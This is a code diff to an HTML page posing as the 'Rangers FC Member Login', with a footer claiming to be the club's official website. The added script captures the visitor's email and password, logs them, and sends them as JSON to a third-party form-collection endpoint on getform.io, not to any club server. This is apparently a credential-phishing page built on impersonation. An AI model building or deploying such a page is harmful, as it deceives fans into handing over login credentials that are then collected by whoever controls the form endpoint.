@@ -8,56 +8,126 @@
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #0047ab;
-            color: white;
+            font-family: 'Helvetica Neue', sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .form-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
         }
-        .form-container {
-            margin-top: 50px;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 8px;
-            display: inline-block;
+
+        h2 {
+            color: #0047ab;
+            font-size: 28px;
+            margin-bottom: 20px;
+            font-weight: bold;
         }
-        input[type="email"], input[type="password"], input[type="tel"] {
+
+        input[type="email"],
+        input[type="password"],
+        input[type="tel"] {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
-            border: none;
-            border-radius: 5px;
-            background-color: #f4f4f4;
-            color: #333;
+            border: 2px solid #ddd;
+            border-radius: 6px;
             font-size: 16px;
+            background-color: #f9f9f9;
+            transition: all 0.3s ease;
         }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="tel"]:focus {
+            border-color: #0047ab;
+            outline: none;
+        }
+
         button {
             width: 100%;
             padding: 12px;
             background-color: #0047ab;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
         }
+
+        button:hover {
+            background-color: #003580;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <h2>Rangers FC Member Login</h2>
-        <form name="rangers-login-form" method="POST" data-netlify="true">
-            <input type="email" name="email" required>
-            <input type="password" name="userPassword" required>
-            <input type="tel" name="phone" required>
+    <!-- Form container with modal styling -->
+    <div class="form-container">
+        <h2>Rangers FC Member Login</h2>
+        
+        <form id="loginForm" action="https://getform.io/f/avrmyepa" method="POST">
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            <input type="password" id="userPassword" name="userPassword" placeholder="Enter your password" required>
             <button type="submit">Login</button>
         </form>
+    </div>
 
-</div>
+    <!-- Footer with Rangers branding -->
+    <div class="footer">
+        <p>Official Website | Rangers Football Club</p>
+    </div>
 
-<script>
-    document.forms['loginForm'].addEventListener('submit', function() {
-        alert('Form submitted successfully!');
-    });
-</script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Capture email and password
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('userPassword').value;
+
+            // Optionally log data to the console for testing
+            console.log(`Email: ${email}, Password: ${password}`);
+
+            // Send form data to Getform
+            fetch('https://getform.io/f/avrmyepa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    userPassword: password
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Handle response from server
+                alert('Form submitted successfully!');
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
 
 </body>
 </html>
